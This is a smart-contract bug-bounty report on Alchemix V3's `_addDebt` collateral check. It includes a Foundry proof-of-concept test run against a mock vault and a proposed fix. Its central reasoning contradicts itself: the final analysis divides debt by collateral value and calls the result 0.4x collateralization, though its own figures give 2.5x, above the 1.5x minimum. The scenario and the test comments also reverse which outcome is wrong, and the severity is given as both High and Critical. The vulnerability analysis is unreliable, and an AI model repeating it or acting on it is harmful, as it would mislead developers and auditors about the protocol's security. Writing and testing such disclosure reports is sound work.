# 57950 sc high unit mismatch in adddebt collateralization check allows unbacked debt issuance and protocol insolvency

**Submitted on Oct 29th 2025 at 15:05:15 UTC by @MentemDeus28 for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57950
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Protocol insolvency

## Description

## Brief/Intro

The `_addDebt` function in `AlchemistV3.sol` incorrectly calculates required locked collateral using `convertDebtTokensToYield`, a function that converts debt tokens to yield tokens while comparing it directly against collateralBalance (which is in yield token shares). This unit mismatch breaks the collateralization invariant and causes the collateralization ratio to be incorrectly evaluated, allowing users to mint debt far exceeding the actual value of their collateral. In production, this leads to unbacked synthetic issuance, protocol insolvency, and total loss of depositor funds.

## Vulnerability Details

The core logic of `_addDebt()` performs a collateralization check before allowing additional debt to be added to a user’s account. However, the implementation mistakenly uses `convertDebtTokensToYield()` to convert debt values into yield tokens, creating a unit mismatch between collateral and debt.

The core issue lies in \_addDebt(), called during mint():

```solidity
 function _addDebt(uint256 tokenId, uint256 amount) internal {
        Account storage account = _accounts[tokenId];

        // Update collateral variables
        uint256 toLock = convertDebtTokensToYield(amount) * minimumCollateralization / FIXED_POINT_SCALAR;
        uint256 lockedCollateral = convertDebtTokensToYield(account.debt) * minimumCollateralization / FIXED_POINT_SCALAR;

        if (account.collateralBalance - lockedCollateral < toLock) revert Undercollateralized();

        account.rawLocked = lockedCollateral + toLock;
        _totalLocked += toLock;
        account.debt += amount;
        totalDebt += amount;
    }
```

Problem Breakdown:

1. account.collateralBalance is denominated in yield tokens (shares).
2. convertDebtTokensToYield() converts debt tokens into yield tokens, based on the current exchange rate.
3. convertDebtTokensToYield() assumes parity between yield token shares and underlying debt value, which only holds when the exchange rate = 1.0.

This introduces a unit mismatch when the exchange rate between yield tokens and underlying assets changes (e.g., due to yield accumulation). As a result: The protocol may think an account is over-collateralized when it’s actually under-collateralized.

Or revert valid mints when the account is safely collateralized.

Scenario

ALICE collateralBalance = 100 shares (100 yieldtokenMYT)

ALICE debt = 50 debt token alice minted 50 debt tokens

conversion rate = 1 yield = 2 debt tokens Exchange rate after yield growth

Current logic:

lockedCollateral = convertDebtTokensToYield(50) = 100 shares

toLock = assuming 50

check: 100 - 100 < 50 → revert (incorrect)

Reality:

Collateral value = 100 shares × 2 = 200 debt tokens

Debt value = 100 debt tokens (after mint)

Should pass (collateralization = 200%)

Because the check is done in mixed units, \_addDebt() either falsely reverts or fails to detect insolvency.

Uses shares, not value

When rate > 1.0, toLock shrinks undercollateralized mint

When rate < 1.0, toLock inflates false revert

Even with correct rate, the logic is fundamentally flawed, it measures shares, not economic value.

## Impact Details

Severity: Critical

This bug directly affects the core accounting of collateralization:

Attackers can over-mint debt beyond their collateral value when the conversion rate skews, draining protocol liquidity.

Conversely, users may experience false reverts, preventing valid mints and disrupting user experience.

If exploited over time, this can lead to system-wide insolvency, where total outstanding debt exceeds total collateral.

Potential impact:

Complete loss of funds backing the synthetic/debt tokens.

Broken mint/burn balance and liquidation logic.

Systemic collapse of protocol solvency guarantees.

## Recommended Mitigation

Use consistent units across the collateralization check always compare values in the same domain (debt units). A correct implementation would look like this

```solidity

function _addDebt(uint256 tokenId, uint256 amount) internal {
    Account storage account = _accounts[tokenId];

    // Convert collateral to DEBT VALUE (not shares)
    uint256 collateralValue = convertYieldTokensToDebt(account.collateralBalance);
    uint256 newDebt = account.debt + amount;

    // Enforce collateralValue >= newDebt * minCol
    require(
        collateralValue * 1e18 >= newDebt * minimumCollateralization,
        "Undercollateralized"
    );

    account.debt = newDebt;
    totalDebt += amount;
}

```

This ensures collateral and debt are compared in the same unit system (debt value), eliminating the mismatch and preventing insolvency risks.

## Reference

<https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L913>

## Proof of Concept

## Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import "forge-std/console2.sol";
import {AlchemistV3} from "../AlchemistV3.sol";
import {Transmuter} from "../Transmuter.sol";
import {IAlchemistV3, IAlchemistV3Errors, AlchemistInitializationParams} from "../interfaces/IAlchemistV3.sol";
import {ITransmuter} from "../interfaces/ITransmuter.sol";
import {AlchemistV3Position} from "../AlchemistV3Position.sol";
import {MockERC20} from "../test/mocks/MockERC20.sol"; 
import {AlchemistV3Handler} from "./AlchemistHandler.sol";
import {TransparentUpgradeableProxy} from "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";



contract MockVault is MockERC20 {
    uint256 conversionRate = 1e18; // 1 MYT = 1 underlying
    constructor() MockERC20("MYT", "MYT", 18) {}
    function convertToAssets(uint256 shares) external view returns (uint256) {
        return (shares * conversionRate) / 1e18;
    }

    function convertToShares(uint256 assets) external view returns (uint256) {
        return (assets * 1e18) / conversionRate;
    }
    function setConversionRate(uint256 rate) external {
        conversionRate = rate;
    }
}

contract AlchemistV3POCGROUND is Test {
   AlchemistV3 public alchemist;
    MockVault mytVault;
    Transmuter public transmuter;
    AlchemistV3Position nft;
    MockERC20 public underlyingToken;
    MockERC20 public collateralToken; // MYT
    MockERC20 public alToken; // Debt token
    AlchemistV3Handler public handler;

     address public constant BOB = address(0x11);
    address public constant ALICE = address(0x12);
    address public constant LIQUIDATOR = address(0x13);
    address public constant PROTOCOLFEERECEIVER = address(0x14);
    uint256 constant TOLERANCE = 1e12; // Rounding tolerance
    uint256 public tokenIdCounter = 0; // Track created tokenIds
    mapping(uint256 => bool) public activeTokenIds; // Track valid tokenIds


    function setUp() public {
        // Deploy tokens
        underlyingToken = new MockERC20("UT", "UT", 18);
        collateralToken = new MockERC20("CL", "CL", 18);
        alToken = new MockERC20("AL", "AL", 18);

        // Deploy Transmuter
        ITransmuter.TransmuterInitializationParams memory transmuterParams = ITransmuter.TransmuterInitializationParams({
            syntheticToken: address(alToken),
            feeReceiver: PROTOCOLFEERECEIVER,
            timeToTransmute: 6500, // ~1 day in blocks
            transmutationFee: 50, // 0.5%
            exitFee: 100, // 1%
            graphSize: 128
        });
        transmuter = new Transmuter(transmuterParams);

        // Deploy MYT vault
        mytVault = new MockVault();

        //Deploy Alchemist implementation
        AlchemistV3 alchemistImpl = new AlchemistV3();

        AlchemistInitializationParams memory alchemistParams = AlchemistInitializationParams({
            debtToken: address(alToken),
            underlyingToken: address(underlyingToken),
            depositCap: type(uint256).max,
            minimumCollateralization: 1.5e18,
            globalMinimumCollateralization: 2e18,
            collateralizationLowerBound: 1.2e18,
            admin: address(this),
            transmuter: address(transmuter),
            protocolFee: 500, // 5%
            protocolFeeReceiver: PROTOCOLFEERECEIVER,
            liquidatorFee: 500,
            repaymentFee: 100,
            myt: address(mytVault)
        });


        // Deploy proxy and initialize
        bytes memory initData = abi.encodeWithSelector(AlchemistV3.initialize.selector, alchemistParams);
        TransparentUpgradeableProxy proxy = new TransparentUpgradeableProxy(
            address(alchemistImpl),
            address(this), // Admin for proxy
            initData
        );
        alchemist = AlchemistV3(address(proxy)); // Cast to AlchemistV3 interface

        
        //deploy nft
        nft = new AlchemistV3Position(address(alchemist));
        alchemist.setAlchemistPositionNFT(address(nft));

         
        
        // Fund tokens
        mytVault.mint(ALICE, 1e50);
        alToken.mint(ALICE, 1e50);
    
        //approve tokens
        vm.startPrank(ALICE);
        mytVault.approve(address(alchemist), type(uint256).max);
        
        alToken.approve(address(alchemist), type(uint256).max);
        vm.stopPrank();

    }


function test_critical_undercollateralized_mint() public {
    uint256 depositAmount = 1_000_000 * 1e18;

    //  STEP 1 Deposit collateral 
    vm.startPrank(ALICE);
    mytVault.mint(ALICE, depositAmount);
    mytVault.approve(address(alchemist), depositAmount);
    alchemist.deposit(depositAmount, ALICE, 0);

    uint256 tokenId = tokenIdCounter + 1;
    require(
        AlchemistV3Position(alchemist.alchemistPositionNFT()).ownerOf(tokenId) == ALICE,
        "Invalid tokenId"
    );
    tokenIdCounter = tokenId;
    activeTokenIds[tokenId] = true;
    vm.stopPrank();

    //STEP 2 Simulate yield drop (conversion rate halves) 
    // CASE 1 YIELD DROP  FALSE REVERT 
    mytVault.setConversionRate(0.5e18); // 1 share = 0.5 assets

    uint256 mintAmount = 0.8e24; 

    // Should revert due to undercollateralization
   vm.expectRevert();
    vm.prank(ALICE);
    alchemist.mint(tokenId, mintAmount, ALICE); //  WRONG: should PASS

    //STEP 3 Simulate yield increase (conversion rate doubles) 
    //CASE 2 YIELD RISE  OVER-MINT ALLOWED 
    mytVault.setConversionRate(2e18);// 1 share = 2 assets

    // Mint should now succeed since collateral appreciated
    vm.prank(ALICE);
    alchemist.mint(tokenId, mintAmount, ALICE); //  WRONG: should REVERT

    (uint256 coll, uint256 debt, ) = alchemist.getCDP(tokenId);
    uint256 collValue = mytVault.convertToAssets(coll);

    emit log_named_uint("Collateral (shares)", coll);
    emit log_named_uint("Debt (tokens)", debt);
    emit log_named_uint("Collateral Value", collValue);

    
    
}
}


```

**Expected Output**

Collateral (shares): 1e24

Debt (tokens): 8e23

Collateral Value: 2e24

**final/proper analysis**

Debt = 8e23

Value = 2e24

Ratio = 8e23 / 2e24 = 0.4x

0.4x collateralization

Should require at least 1.5x (minimumCollateralization)

Mint should revert

BUT IT PASSED

The check is based on shares, not value.It ignores the vault rate.
